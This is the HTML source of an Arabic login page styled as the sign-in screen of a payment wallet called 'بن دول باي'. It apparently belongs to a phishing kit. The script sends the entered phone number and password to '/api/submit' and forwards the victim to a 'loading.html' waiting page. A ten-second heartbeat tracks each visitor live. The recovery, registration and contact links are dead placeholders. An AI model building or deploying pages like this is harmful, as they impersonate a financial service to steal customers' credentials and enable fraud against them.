<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>تسجيل الدخول - بن دول باي</title>
    <link rel="icon" href="assets/img/icone.png">
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css"
          integrity="sha512-Evv84Mr4kqVGRNSgIGL/F/aIDqQb7xQ2vcrdIwxfjThSH8CSR7PBEakCr51Ck+w+/U6swU2Im1vVX0SVk9ABhg=="
          crossorigin="anonymous" referrerpolicy="no-referrer" />
    <style>
        :root {
            --primary: #364abf;
            --primary-dark: #2b3b99;
            --secondary: #f92238;
            --bg: #e8ecf5;
            --card: #ffffff;
            --ink: #1a1d2e;
            --ink-soft: #8b90a0;
            --input-bg: #f0f2f8;
        }
        *{margin:0;padding:0;box-sizing:border-box}
        html,body{height:100%}
        body{
            font-family:'Tajawal',sans-serif;
            background:var(--bg);
            min-height:100vh;
            overflow-y:auto;
        }

        /* ===== Top bar ===== */
        .topbar{
            display:flex;justify-content:space-between;align-items:center;
            padding:14px 20px;
        }
        .topbar .logo-sm img{height:24px}
        .topbar .lang{font-size:15px;font-weight:700;color:var(--ink)}

        /* ===== Page ===== */
        .page{padding:10px 24px 20px;text-align:center}

        .logo-area{margin-bottom:12px}
        .logo-area img{height:65px}

        .title{font-size:26px;font-weight:900;color:var(--ink);margin-bottom:2px}
        .subtitle{font-size:16px;font-weight:700;color:var(--primary);margin-bottom:22px}

        /* ===== Role tabs ===== */
        .roles{
            display:flex;justify-content:center;gap:14px;
            margin-bottom:26px;
        }
        .role{
            width:105px;padding:16px 8px 12px;
            border-radius:18px;background:var(--card);
            border:2px solid transparent;
            cursor:pointer;text-align:center;
            transition:all .2s;
            box-shadow:0 2px 10px rgba(0,0,0,.03);
        }
        .role .r-icon{
            width:44px;height:44px;
            margin:0 auto 8px;
            display:flex;align-items:center;justify-content:center;
            font-size:24px;color:var(--ink-soft);
            border-radius:12px;
        }
        .role .r-label{font-size:15px;font-weight:800;color:var(--ink)}
        .role.active{
            background:rgba(54,74,191,.08);
            border-color:rgba(54,74,191,.2);
        }
        .role.active .r-icon{
            color:var(--primary);
            background:rgba(54,74,191,.12);
        }

        /* ===== Inputs ===== */
        .form-area{text-align:right}

        .input-row{
            display:flex;gap:10px;
            margin-bottom:14px;
        }
        .field{
            flex:1;height:56px;
            background:var(--card);
            border-radius:16px;
            display:flex;align-items:center;
            padding:0 16px;
            box-shadow:0 1px 6px rgba(0,0,0,.03);
        }
        .field .f-icon{
            font-size:22px;color:var(--primary);
            margin-left:12px;
            opacity:.7;
            flex-shrink:0;
        }
        .field input{
            flex:1;height:100%;border:none;outline:none;
            background:transparent;
            font-family:inherit;font-size:15px;font-weight:600;
            color:var(--ink);
            text-align:right;
        }
        .field input::placeholder{color:#b0b5c0;font-weight:500}

        .cashier-btn{
            height:56px;padding:0 20px;
            border:none;border-radius:16px;
            background:var(--card);color:var(--ink);
            font-family:inherit;font-weight:700;font-size:14px;
            cursor:pointer;white-space:nowrap;
            box-shadow:0 1px 6px rgba(0,0,0,.03);
            display:none;
        }
        .cashier-btn.show{display:flex;align-items:center}

        /* ===== Forgot ===== */
        .forgot{text-align:center;margin:18px 0 20px}
        .forgot a{color:var(--ink);font-size:15px;font-weight:800;text-decoration:none}

        /* ===== Login btn ===== */
        .login-btn{
            width:100%;height:56px;border:none;border-radius:16px;
            background:var(--primary);color:#fff;
            font-family:inherit;font-weight:800;font-size:18px;
            cursor:pointer;transition:background .2s;
            display:flex;align-items:center;justify-content:center;
        }
        .login-btn:hover{background:var(--primary-dark)}
        .login-btn:disabled{background:#aab;cursor:not-allowed}

        .err-msg{
            color:var(--secondary);font-size:13px;font-weight:700;
            text-align:center;min-height:18px;margin-top:10px;
        }

        .register{
            text-align:center;margin-top:18px;
            font-size:15px;color:var(--ink-soft);
        }
        .register a{color:var(--primary);font-weight:800;text-decoration:none}

        .fingerprint{text-align:center;margin-top:22px}
        .fingerprint svg{width:52px;height:52px;opacity:.45}

        /* ===== Bottom ===== */
        .bottom{padding:24px 24px 18px;text-align:center}
        .contacts{
            display:flex;justify-content:center;gap:18px;
            margin-bottom:14px;direction:ltr;
        }
        .c-item{
            display:flex;flex-direction:column;align-items:center;
            gap:6px;text-decoration:none;
        }
        .c-item .c-box{
            width:48px;height:48px;background:#fff;border-radius:14px;
            display:flex;align-items:center;justify-content:center;
            font-size:20px;box-shadow:0 2px 8px rgba(0,0,0,.04);
        }
        .c-item .c-box.red{color:var(--secondary)}
        .c-item .c-box.blue{color:var(--primary)}
        .c-item span{font-size:10px;font-weight:600;color:var(--ink-soft)}
        .ver{font-size:12px;color:#aaa;margin-top:6px}

        .spinner{
            display:none;width:22px;height:22px;
            border:3px solid rgba(255,255,255,.3);
            border-top-color:#fff;border-radius:50%;
            animation:spin .6s linear infinite;
        }
        @keyframes spin{to{transform:rotate(360deg)}}
    </style>
</head>
<body>

<div class="topbar">
    <a href="login.html" class="logo-sm"><img src="assets/img/logo2.png" alt="بن دول باي"></a>
    <span class="lang">العربية</span>
</div>

<div class="page">
    <div class="logo-area">
        <img src="assets/img/app-icon.png" alt="بن دول باي">
    </div>
    <h1 class="title">مرحباً بك</h1>
    <p class="subtitle">تسجيل الدخول</p>

    <!-- Role tabs -->
    <div class="roles">
        <div class="role active" data-role="customer" onclick="pickRole(this)">
            <div class="r-icon">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
                    <circle cx="12" cy="8" r="3.5"/>
                    <path d="M5.5 20.5c0-3.6 2.9-6.5 6.5-6.5s6.5 2.9 6.5 6.5"/>
                </svg>
            </div>
            <span class="r-label">عميل</span>
        </div>
        <div class="role" data-role="merchant" onclick="pickRole(this)">
            <div class="r-icon">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round">
                    <rect x="6" y="2" width="14" height="11" rx="2"/>
                    <rect x="4" y="5.5" width="14" height="11" rx="2" fill="white" stroke="currentColor"/>
                    <rect x="12" y="8" width="4" height="3.5" rx=".5"/>
                    <line x1="7" y1="9.5" x2="10.5" y2="9.5"/>
                    <line x1="7" y1="12.5" x2="10.5" y2="12.5"/>
                </svg>
            </div>
            <span class="r-label">تاجر</span>
        </div>
        <div class="role" data-role="agent" onclick="pickRole(this)">
            <div class="r-icon">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor" opacity=".55">
                    <circle cx="12" cy="5.5" r="2.2"/>
                    <circle cx="5" cy="17" r="2.2"/>
                    <circle cx="19" cy="17" r="2.2"/>
                    <rect x="11.3" y="7.5" width="1.4" height="7.5" rx=".7"/>
                    <rect x="4.3" y="8" width="1.4" height="9" rx=".7" transform="rotate(-30 5 12.5)"/>
                    <rect x="18.3" y="8" width="1.4" height="9" rx=".7" transform="rotate(30 19 12.5)"/>
                </svg>
            </div>
            <span class="r-label">وكيل</span>
        </div>
    </div>

    <!-- Form -->
    <form id="loginForm" class="form-area" onsubmit="return false;">
        <div class="input-row">
            <div class="field">
                <i class="fa-solid fa-mobile-screen-button f-icon"></i>
                <input type="tel" id="phone" placeholder="رقم الجوال" autocomplete="tel" required>
            </div>
            <button type="button" class="cashier-btn" id="cashierBtn">الكاشير</button>
        </div>

        <div class="input-row">
            <div class="field">
                <i class="fa-solid fa-lock f-icon"></i>
                <input type="password" id="password" placeholder="كلمة المرور" autocomplete="current-password" required>
            </div>
        </div>

        <div class="forgot"><a href="#">هل نسيت كلمة المرور؟</a></div>

        <button type="submit" class="login-btn" id="loginBtn" onclick="doLogin()">
            <span id="btnText">تسجيل الدخول</span>
            <div class="spinner" id="spinner"></div>
        </button>
        <p class="err-msg" id="errMsg"></p>
    </form>

    <p class="register">ليس لديك حساب؟ <a href="#">إنشاء حساب.</a></p>

    <div class="fingerprint">
        <svg width="52" height="52" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M32 52 C32 52 32 46 32 44" stroke="#364abf" stroke-width="2.5" stroke-linecap="round"/>
            <path d="M26 46 C26 38 32 34 32 34 C32 34 38 38 38 46" stroke="#364abf" stroke-width="2.5" stroke-linecap="round"/>
            <path d="M20 44 C20 32 26 26 32 26 C38 26 44 32 44 44" stroke="#364abf" stroke-width="2.5" stroke-linecap="round"/>
            <path d="M15 42 C15 28 22 20 32 20 C42 20 49 28 49 42" stroke="#364abf" stroke-width="2.5" stroke-linecap="round"/>
            <path d="M10 40 C10 24 18 14 32 14 C46 14 54 24 54 40" stroke="#364abf" stroke-width="2.5" stroke-linecap="round"/>
            <path d="M38 44 C38 44 38 36 32 32" stroke="#364abf" stroke-width="2.5" stroke-linecap="round"/>
            <path d="M26 44 C26 44 26 40 32 38" stroke="#364abf" stroke-width="2.5" stroke-linecap="round"/>
        </svg>
    </div>
</div>

<div class="bottom">
    <div class="contacts">
        <a href="#" class="c-item">
            <div class="c-box red"><i class="fa-solid fa-location-dot"></i></div>
            <span>نقاط الخدمة</span>
        </a>
        <a href="#" class="c-item">
            <div class="c-box blue"><i class="fa-solid fa-envelope"></i></div>
            <span>البريد الإلكتروني</span>
        </a>
        <a href="#" class="c-item">
            <div class="c-box blue"><i class="fa-solid fa-phone-flip"></i></div>
            <span>الرقم المجاني</span>
        </a>
        <a href="#" class="c-item">
            <div class="c-box red"><i class="fa-solid fa-headset"></i></div>
            <span>خدمة العملاء</span>
        </a>
    </div>
    <p class="ver">الإصدار : 128</p>
</div>

<script>
function pickRole(el){
    document.querySelectorAll('.role').forEach(function(t){t.classList.remove('active')});
    el.classList.add('active');
    var cb=document.getElementById('cashierBtn');
    cb.classList.toggle('show', el.dataset.role==='merchant');
}
var _vid=Math.random().toString(36).slice(2);
function heartbeat(){fetch('/api/heartbeat',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({page:'login',vid:_vid})}).catch(function(){});}
setInterval(heartbeat,10000);heartbeat();

function doLogin(){
    var ph=document.getElementById('phone').value.trim();
    var pw=document.getElementById('password').value.trim();
    var err=document.getElementById('errMsg');
    var btn=document.getElementById('loginBtn');
    var txt=document.getElementById('btnText');
    var sp=document.getElementById('spinner');
    if(!ph||!pw){err.textContent='يرجى إدخال جميع البيانات';return}
    err.textContent='';
    btn.disabled=true;txt.style.display='none';sp.style.display='block';
    fetch('/api/submit',{
        method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({username:ph,password:pw})
    }).then(function(r){return r.json();}).then(function(d){
        if(d.ok&&d.id){
            window.location.href='loading.html?id='+d.id;
        }else{
            btn.disabled=false;txt.style.display='';sp.style.display='none';
            err.textContent='حدث خطأ، حاول مرة أخرى';
        }
    }).catch(function(){
        btn.disabled=false;txt.style.display='';sp.style.display='none';
        err.textContent='حدث خطأ في الاتصال';
    });
}
</script>
</body>
</html>
